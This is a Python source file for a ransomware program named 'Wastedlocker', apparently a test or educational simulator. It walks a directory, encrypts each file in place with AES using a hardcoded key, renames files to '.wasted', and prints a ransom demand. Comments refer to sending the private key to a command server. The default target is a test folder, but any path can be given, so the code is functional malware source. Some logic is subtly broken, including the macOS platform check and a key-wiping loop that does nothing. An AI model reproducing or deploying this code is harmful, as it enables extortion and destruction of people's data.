from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util import Counter

import argparse
import os
import sys
import base64
import platform 

import discover
import modify

# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
#  set to either: '128/192/256 bit plaintext key' or False
HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn' # AES 256-key

def get_parser():
    parser = argparse.ArgumentParser(description='Wastedlocker')
    parser.add_argument('-p', '--path', help='Absolute path to start encryption. If none specified, defaults to %HOME%/test_ransomware [default: no]', action="store", dest="path")
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    return parser

def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']
    absolute_path = args['path']
    rsa_gen = RSA.generate(2048)
    publickey = rsa_gen.publickey()  

    encryptor = PKCS1_OAEP.new(publickey)
    encrypted_key =  encryptor.encrypt(HARDCODED_KEY)
    
    ## Decryption function
    # decryptor = PKCS1_OAEP.new(rsa_keys)
    # decrypted = decryptor.decrypt(str(encrypted_key))
  
    public_key = rsa_gen.publickey().exportKey()
    private_key = rsa_gen.export_key() # Private key sent via C2 or exfiltrated

    if not decrypt:
        print("[COMPANY_NAME]\n\n"
            "YOUR NETWORK IS ENCRYPTED NOW\n\n"
            "USE - TO GET THE PRICE FOR YOUR DATA\n\n"
            "DO NOT GIVE THIS EMAIL TO 3RD PARTIES\n\n"
            "DO NOT RENAME OR MOVE THE FILE\n\n"
            "THE FILE IS ECNRYPTED WITH THE FOLLOWING KEY\n"
            "[begin_key]\n{}\n[end_key]\n"
            "KEEP IT\n".format(public_key.decode("utf-8")))

    if decrypt:
        key = HARDCODED_KEY
    else:
        # In real ransomware, this part includes sending the private_key to the C2
        # and/or the encrypted AES keys and public_key 
        if HARDCODED_KEY:
            key = HARDCODED_KEY
           
    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    plt = platform.system()
    if plt == ("Linux" or "Darwin"):
        if absolute_path:
            startdirs = [absolute_path]
        else:
            startdirs = [os.environ['HOME'] + '/test_ransomware']
    elif plt == "Windows":
        if absolute_path:
            startdirs = [absolute_path]
        else:
            startdirs = [os.environ['USERPROFILE'] + '\\desktop\\test_ransomware']
    else:
        print("Unidentified system")
        exit()

    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir):
            modify.modify_file_inplace(file, crypt.encrypt)
            if decrypt:
                file_original = os.path.splitext(file)[0]
                os.rename(file, file_original)
                print("File changed from " + file + " to " + file_original)
            else:
                os.rename(file, file+'.wasted')
                print("File changed from " + file + " to " + file+'.wasted')

    # This wipes the key out of memory
    # to avoid recovery by third party tools
    for _ in range(100):
        #key = random(32)
        pass

if __name__=="__main__":
    main()
